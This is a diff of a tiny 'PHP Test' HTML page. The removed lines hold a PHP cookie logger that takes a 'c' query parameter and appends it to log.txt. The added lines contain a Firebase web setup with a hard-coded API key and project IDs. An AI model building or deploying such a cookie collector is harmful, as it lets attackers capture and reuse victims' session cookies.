@@ -1,13 +1,28 @@
 <html>
-    <head>
-        <title>PHP Test</title>
-    </head>
-    <body>
-        <p>Hello World</p>
-        <?php
-            $cookies = $_GET["c"];
-            $file = fopen('log.txt', 'a');
-            fwrite($file, $cookies . "\n\n");
-        ?>
-    </body>
+	<head>
+	<title>PHP Test</title>
+	</head>
+	<body>
+		<p>Hello World</p>
+		<!-- The core Firebase JS SDK is always required and must be listed first -->
+		<script src="https://www.gstatic.com/firebasejs/7.1.0/firebase-app.js"></script>
+
+		<!-- TODO: Add SDKs for Firebase products that you want to use
+		https://firebase.google.com/docs/web/setup#available-libraries -->
+
+		<script>
+			// Your web app's Firebase configuration
+			var firebaseConfig = {
+				apiKey: "AIzaSyDxQo6lE2r8jpmfRjnSo-K01OIX0WUmrX4",
+				authDomain: "github-page-8e794.firebaseapp.com",
+				databaseURL: "https://github-page-8e794.firebaseio.com",
+				projectId: "github-page-8e794",
+				storageBucket: "",
+				messagingSenderId: "1005952043228",
+				appId: "1:1005952043228:web:d1dff9114ef5de17a9cc19"
+			};
+			// Initialize Firebase
+			firebase.initializeApp(firebaseConfig);
+		</script>
+	</body>
 </html>
